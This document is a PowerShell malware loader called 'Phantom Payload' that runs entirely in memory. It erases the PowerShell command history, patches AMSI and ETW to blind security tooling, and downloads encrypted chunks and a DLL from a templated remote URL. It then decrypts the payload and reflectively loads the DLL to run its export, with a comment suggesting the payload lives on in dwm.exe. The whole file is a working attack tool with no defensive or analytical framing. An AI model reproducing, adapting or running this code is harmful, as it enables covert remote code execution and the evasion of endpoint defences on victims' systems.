#  <~ Phantom Payload loader. 100% in-memory. No file written to disk. ~>
$ErrorActionPreference = 'SilentlyContinue'

# -- 1. Clear PSReadLine history (removes the one-liner from .txt log) --
try {
    Set-PSReadLineOption -HistorySaveStyle SaveNothing
    $hp = (Get-PSReadLineOption).HistorySavePath
    if ($hp -and (Test-Path $hp)) { Clear-Content $hp -Force }
} catch {}

# -- 2. AMSI bypass (reflection patch of AmsiScanBuffer) --
try {
    $am = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    if ($am) {
        $f = $am.GetField('amsiInitFailed','NonPublic,Static')
        if ($f) { $f.SetValue($null, $true) }
    }
} catch {}

# -- 3. ETW bypass (patch EtwEventWrite in-process via reflection) --
try {
    $et = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    if ($et) {
        $ef = $et.GetField('etwProvider','NonPublic,Static')
        if ($ef) {
            $pr = $ef.GetValue($null)
            $en = $pr.GetType().GetField('m_enabled','NonPublic,Instance')
            if ($en) { $en.SetValue($pr, 0) }
        }
    }
} catch {}

# -- 4. Config (populated by the pipeline) --
$BaseUrl    = '__REPLACE_WITH_BASE_URL__/'
$ChunkCount = 10
$KeyHex     = '6db02580be9a4fdfa1bd8da241b41f03b2cd2e36edf5ebef2feedeabb02a843c'
$MacUrl     = $BaseUrl + 'mac.b64'
$SlUrl      = $BaseUrl + 'sl.b64'

# -- 5. Helper: hex â†’ bytes --
function Hex-To-Bytes([string]$h) {
    $r = New-Object byte[] ($h.Length / 2)
    for ($i = 0; $i -lt $h.Length; $i += 2) {
        $r[$i / 2] = [Convert]::ToByte($h.Substring($i, 2), 16)
    }
    return ,$r
}

# -- 6. Fetch chunks + reassemble --
$wc = New-Object System.Net.WebClient
$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
$envParts = @()
$totalSize = 0
for ($i = 1; $i -le $ChunkCount; $i++) {
    $name = 'cfg-{0:D2}.txt' -f $i
    $b64 = $wc.DownloadString($BaseUrl + $name)
    $part = [Convert]::FromBase64String($b64.Trim())
    $envParts += ,$part
    $totalSize += $part.Length
}
$envelope = New-Object byte[] $totalSize
$off = 0
foreach ($p in $envParts) {
    [Buffer]::BlockCopy($p, 0, $envelope, $off, $p.Length)
    $off += $p.Length
}

$macB64 = $wc.DownloadString($MacUrl)
$macRef = [Convert]::FromBase64String($macB64.Trim())
$slB64  = $wc.DownloadString($SlUrl)
$slDll  = [Convert]::FromBase64String($slB64.Trim())
$wc.Dispose()

# -- 7. Split envelope: [IV 16B][ciphertext ...] --
$iv = New-Object byte[] 16
$ct = New-Object byte[] ($envelope.Length - 16)
[Buffer]::BlockCopy($envelope, 0,  $iv, 0, 16)
[Buffer]::BlockCopy($envelope, 16, $ct, 0, $ct.Length)

# -- 8. HMAC verify --
$key = Hex-To-Bytes $KeyHex
$hm  = [System.Security.Cryptography.HMACSHA256]::new($key)
$macCur = $hm.ComputeHash($ct)
$hm.Dispose()
$ok = $true
if ($macCur.Length -ne $macRef.Length) { $ok = $false }
else {
    $xor = 0
    for ($i = 0; $i -lt $macCur.Length; $i++) { $xor = $xor -bor ($macCur[$i] -bxor $macRef[$i]) }
    if ($xor -ne 0) { $ok = $false }
}
if (-not $ok) { return }

# -- 9. AES-256-CBC decrypt --
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key = $key
$aes.IV  = $iv
$dec = $aes.CreateDecryptor()
$ms  = New-Object System.IO.MemoryStream
$cs  = New-Object System.Security.Cryptography.CryptoStream($ms, $dec, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cs.Write($ct, 0, $ct.Length)
$cs.FlushFinalBlock()
$fivem = $ms.ToArray()
$cs.Dispose(); $ms.Dispose(); $dec.Dispose(); $aes.Dispose()

# -- 10. Scrub sensitive buffers --
[Array]::Clear($key, 0, $key.Length)
[Array]::Clear($ct,  0, $ct.Length)
[Array]::Clear($iv,  0, $iv.Length)
$envelope = $null; $envParts = $null

# -- 11. In-memory P/Invoke bootstrap via Reflection.Emit --
$dn = [System.AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('Dz')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$md = $dn.DefineDynamicModule('Dm', $false)
$tb = $md.DefineType('Dt', [System.Reflection.TypeAttributes]::Public)
function Def([string]$dll,[string]$fn,[Type]$ret,[Type[]]$params) {
    $m = $tb.DefinePInvokeMethod($fn, $dll, 'Public,Static,PinvokeImpl',
        [System.Reflection.CallingConventions]::Standard,
        $ret, $params,
        [System.Runtime.InteropServices.CallingConvention]::Winapi,
        [System.Runtime.InteropServices.CharSet]::Ansi)
    $m.SetImplementationFlags([System.Reflection.MethodImplAttributes]::PreserveSig)
}
Def 'kernel32' 'VirtualAlloc'     ([IntPtr]) @([IntPtr],[UIntPtr],[UInt32],[UInt32])
Def 'kernel32' 'VirtualProtect'   ([Bool])   @([IntPtr],[UIntPtr],[UInt32],[UInt32].MakeByRefType())
Def 'kernel32' 'LoadLibraryA'     ([IntPtr]) @([String])
Def 'kernel32' 'GetProcAddress'   ([IntPtr]) @([IntPtr],[String])
Def 'kernel32' 'GetModuleHandleA' ([IntPtr]) @([String])
$Native = $tb.CreateType()

# -- 12. Reflective PE load of sl.dll --
function Reflect-Load([byte[]]$pe) {
    $e_lfanew = [BitConverter]::ToInt32($pe, 0x3C)
    $sizeOfImage = [BitConverter]::ToInt32($pe, $e_lfanew + 0x50)
    $sizeOfHeaders = [BitConverter]::ToInt32($pe, $e_lfanew + 0x54)
    $imageBase = [BitConverter]::ToUInt64($pe, $e_lfanew + 0x30)
    $entryRva = [BitConverter]::ToInt32($pe, $e_lfanew + 0x28)
    $numSections = [BitConverter]::ToInt16($pe, $e_lfanew + 0x06)
    $optHdrSize = [BitConverter]::ToInt16($pe, $e_lfanew + 0x14)
    $firstSec = $e_lfanew + 0x18 + $optHdrSize
    $relocDirRva = [BitConverter]::ToInt32($pe, $e_lfanew + 0x90 + 0 * 8)
    $relocDirSz  = [BitConverter]::ToInt32($pe, $e_lfanew + 0x94 + 0 * 8)
    $importDirRva = [BitConverter]::ToInt32($pe, $e_lfanew + 0x90)
    $exportDirRva = [BitConverter]::ToInt32($pe, $e_lfanew + 0x88)

    # Alloc preferred base first; fall back to any address.
    $base = $Native::VirtualAlloc([IntPtr]$imageBase, [UIntPtr]$sizeOfImage, 0x3000, 0x40)
    if ($base -eq [IntPtr]::Zero) {
        $base = $Native::VirtualAlloc([IntPtr]::Zero, [UIntPtr]$sizeOfImage, 0x3000, 0x40)
    }
    if ($base -eq [IntPtr]::Zero) { return [IntPtr]::Zero }

    # Copy headers.
    [System.Runtime.InteropServices.Marshal]::Copy($pe, 0, $base, $sizeOfHeaders)

    # Copy sections.
    for ($i = 0; $i -lt $numSections; $i++) {
        $sh = $firstSec + $i * 0x28
        $vAddr   = [BitConverter]::ToInt32($pe, $sh + 0x0C)
        $rawSize = [BitConverter]::ToInt32($pe, $sh + 0x10)
        $rawPtr  = [BitConverter]::ToInt32($pe, $sh + 0x14)
        if ($rawSize -gt 0) {
            $dst = [IntPtr]([Int64]$base + $vAddr)
            [System.Runtime.InteropServices.Marshal]::Copy($pe, $rawPtr, $dst, $rawSize)
        }
    }

    # Apply relocations.
    $delta = [Int64]$base - [Int64]$imageBase
    if ($delta -ne 0 -and $relocDirSz -gt 0) {
        $p = $relocDirRva
        $end = $relocDirRva + $relocDirSz
        while ($p -lt $end) {
            $pageRva = [BitConverter]::ToInt32($pe, (RvaOff $pe $p $firstSec $numSections))
            $blkSize = [BitConverter]::ToInt32($pe, (RvaOff $pe ($p + 4) $firstSec $numSections))
            if ($blkSize -lt 8) { break }
            $entries = ($blkSize - 8) / 2
            for ($j = 0; $j -lt $entries; $j++) {
                $raw = [BitConverter]::ToUInt16($pe, (RvaOff $pe ($p + 8 + $j * 2) $firstSec $numSections))
                $type = $raw -shr 12
                $off  = $raw -band 0x0FFF
                if ($type -eq 10) { # IMAGE_REL_BASED_DIR64
                    $tgt = [IntPtr]([Int64]$base + $pageRva + $off)
                    $cur = [System.Runtime.InteropServices.Marshal]::ReadInt64($tgt)
                    [System.Runtime.InteropServices.Marshal]::WriteInt64($tgt, $cur + $delta)
                }
            }
            $p += $blkSize
        }
    }

    # Resolve imports.
    if ($importDirRva -gt 0) {
        $imp = $importDirRva
        while ($true) {
            $iatRva  = [BitConverter]::ToInt32($pe, (RvaOff $pe ($imp + 0x10) $firstSec $numSections))
            $nameRva = [BitConverter]::ToInt32($pe, (RvaOff $pe ($imp + 0x0C) $firstSec $numSections))
            $oftRva  = [BitConverter]::ToInt32($pe, (RvaOff $pe ($imp + 0x00) $firstSec $numSections))
            if ($nameRva -eq 0 -and $iatRva -eq 0) { break }
            $dllName = Read-CStr $pe (RvaOff $pe $nameRva $firstSec $numSections)
            $hMod = $Native::LoadLibraryA($dllName)
            if ($hMod -eq [IntPtr]::Zero) { $imp += 0x14; continue }
            $thunkRva = if ($oftRva -ne 0) { $oftRva } else { $iatRva }
            $k = 0
            while ($true) {
                $thunk = [BitConverter]::ToInt64($pe, (RvaOff $pe ($thunkRva + $k * 8) $firstSec $numSections))
                if ($thunk -eq 0) { break }
                $fnName = $null
                if ($thunk -lt 0) { # ordinal
                    $ordinal = $thunk -band 0xFFFF
                    $fn = $Native::GetProcAddress($hMod, [IntPtr]$ordinal)
                } else {
                    $hintNameRva = $thunk
                    $fnName = Read-CStr $pe (RvaOff $pe ($hintNameRva + 2) $firstSec $numSections)
                    $fn = $Native::GetProcAddress($hMod, $fnName)
                }
                $iatSlot = [IntPtr]([Int64]$base + $iatRva + $k * 8)
                [System.Runtime.InteropServices.Marshal]::WriteInt64($iatSlot, [Int64]$fn)
                $k++
            }
            $imp += 0x14
        }
    }

    # Flip section protection.
    for ($i = 0; $i -lt $numSections; $i++) {
        $sh = $firstSec + $i * 0x28
        $vAddr    = [BitConverter]::ToInt32($pe, $sh + 0x0C)
        $vSize    = [BitConverter]::ToInt32($pe, $sh + 0x08)
        $chars    = [BitConverter]::ToUInt32($pe, $sh + 0x24)
        $prot = 0x02 # R
        $exec  = ($chars -band 0x20000000) -ne 0
        $read  = ($chars -band 0x40000000) -ne 0
        $write = ($chars -band 0x80000000) -ne 0
        if ($exec -and $write) { $prot = 0x40 }
        elseif ($exec)         { $prot = 0x20 }
        elseif ($write)        { $prot = 0x04 }
        elseif ($read)         { $prot = 0x02 }
        $old = 0
        [void]$Native::VirtualProtect([IntPtr]([Int64]$base + $vAddr), [UIntPtr]$vSize, $prot, [ref]$old)
    }

    # Find RunLaunchFromMemory export.
    if ($exportDirRva -eq 0) { return [IntPtr]::Zero }
    $ed = [Int64]$base + $exportDirRva
    $numNames = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($ed + 0x18))
    $namesRva = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($ed + 0x20))
    $ordsRva  = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($ed + 0x24))
    $funcsRva = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($ed + 0x1C))
    $exportFn = [IntPtr]::Zero
    for ($i = 0; $i -lt $numNames; $i++) {
        $nRva = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]([Int64]$base + $namesRva + $i * 4))
        $nm = Read-CStr-FromPtr ([IntPtr]([Int64]$base + $nRva))
        if ($nm -eq 'RunLaunchFromMemory') {
            $ord = [System.Runtime.InteropServices.Marshal]::ReadInt16([IntPtr]([Int64]$base + $ordsRva + $i * 2))
            $fnRva = [System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]([Int64]$base + $funcsRva + $ord * 4))
            $exportFn = [IntPtr]([Int64]$base + $fnRva)
            break
        }
    }
    return $exportFn
}

function RvaOff([byte[]]$pe, [int]$rva, [int]$firstSec, [int]$numSections) {
    for ($i = 0; $i -lt $numSections; $i++) {
        $sh = $firstSec + $i * 0x28
        $vAddr  = [BitConverter]::ToInt32($pe, $sh + 0x0C)
        $vSize  = [BitConverter]::ToInt32($pe, $sh + 0x08)
        $rawPtr = [BitConverter]::ToInt32($pe, $sh + 0x14)
        if ($rva -ge $vAddr -and $rva -lt ($vAddr + $vSize)) {
            return $rawPtr + ($rva - $vAddr)
        }
    }
    return $rva
}

function Read-CStr([byte[]]$pe, [int]$off) {
    $s = ''
    while ($pe[$off] -ne 0) { $s += [char]$pe[$off]; $off++ }
    return $s
}

function Read-CStr-FromPtr([IntPtr]$p) {
    return [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($p)
}

$entry = Reflect-Load $slDll
if ($entry -eq [IntPtr]::Zero) { return }

# -- 13. Build delegate for RunLaunchFromMemory(const uint8_t*, int) â†’ int --
$delType = $md.DefineType('Dg', [System.Reflection.TypeAttributes]::Public, [System.MulticastDelegate])
$delCtor = $delType.DefineConstructor('RTSpecialName,HideBySig,Public',
    [System.Reflection.CallingConventions]::Standard,
    @([Object],[IntPtr]))
$delCtor.SetImplementationFlags('Runtime,Managed')
$delInvoke = $delType.DefineMethod('Invoke',
    'Public,HideBySig,NewSlot,Virtual',
    [Int32], @([IntPtr],[Int32]))
$delInvoke.SetImplementationFlags('Runtime,Managed')
$delT = $delType.CreateType()
$del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($entry, $delT)

# -- 14. Pin Fivem bytes + call export --
$pin = [System.Runtime.InteropServices.GCHandle]::Alloc($fivem, [System.Runtime.InteropServices.GCHandleType]::Pinned)
try {
    [void]$del.Invoke($pin.AddrOfPinnedObject(), $fivem.Length)
} finally {
    $pin.Free()
    [Array]::Clear($fivem, 0, $fivem.Length)
}

# -- 15. Done. PowerShell exits; dwm.exe keeps running. --